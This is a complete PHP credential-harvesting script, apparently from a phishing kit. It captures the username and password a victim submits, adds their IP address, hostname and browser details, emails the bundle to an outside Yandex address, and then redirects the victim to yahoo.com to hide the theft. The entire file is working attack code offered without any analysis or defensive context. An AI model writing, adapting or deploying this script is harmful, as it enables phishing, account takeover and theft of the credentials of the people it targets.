<?php
if($_POST["userid"] != "" and $_POST["password"] != ""){
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "---------=Online Info=---------\n";
$message .= "User Name: ".$_POST['userid']."\n";
$message .= "Password:  ".$_POST['password']."\n";
$message .= "---------=IP Address & Date=---------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|-----------JATBOSS --------------|\n";
$send = "jatboss@yandex.com";
$subject = "Login | $ip";
{
mail("$send", "$subject", $message);   
}
  header ("Location: https://yahoo.com");
}else{
header ("Location: index.php");
}

?>